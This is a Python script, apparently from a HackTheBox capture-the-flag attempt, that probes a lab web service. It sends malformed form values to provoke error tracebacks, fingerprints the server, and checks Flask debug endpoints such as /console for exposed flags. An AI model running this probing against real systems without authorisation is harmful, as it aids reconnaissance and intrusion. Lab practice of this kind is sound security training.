#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 81: Intentar enviar request malformado para obtener error con info
print("[*] INNOVACIÓN 81: Provocar errores para obtener info")
s = requests.Session()
s.get(base_url)

malformed = [
    {'freq': 'ABC', 'mod': 'ASK', 'bits': '1', 'msg': 'TEST'},
    {'freq': '433.92', 'mod': 'INVALID', 'bits': '1', 'msg': 'TEST'},
    {'freq': '433.92', 'mod': 'ASK', 'bits': 'ABC', 'msg': 'TEST'},
    {'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': 'ZZZZ'},
]

for payload in malformed:
    r = s.post(f'{base_url}/transmit', data=payload)
    if 'error' in r.text.lower() or 'exception' in r.text.lower() or 'traceback' in r.text.lower():
        print(f"[+] Error response for {payload}:")
        print(r.text[:500])
        if 'HTB{' in r.text:
            print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 82: Revisar el servidor web en detalle
print("\n[*] INNOVACIÓN 82: Server fingerprinting")
r = s.get(base_url)
server = r.headers.get('Server', 'Unknown')
print(f"Server: {server}")

# Si es Flask, probar endpoints comunes de Flask
if 'werkzeug' in server.lower() or 'flask' in server.lower() or 'python' in server.lower():
    print("[+] Parece ser Flask/Python")
    
    flask_endpoints = [
        '/console',
        '/debug',
        '/_debug_toolbar',
        '/server-status',
    ]
    
    for endpoint in flask_endpoints:
        try:
            r = s.get(f'{base_url}{endpoint}')
            if r.status_code != 404:
                print(f"  [+] {endpoint}: {r.status_code}")
                if 'HTB{' in r.text:
                    print(f'    [SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))
        except:
            pass

print("\n[*] Innovaciones 81-82 completadas")
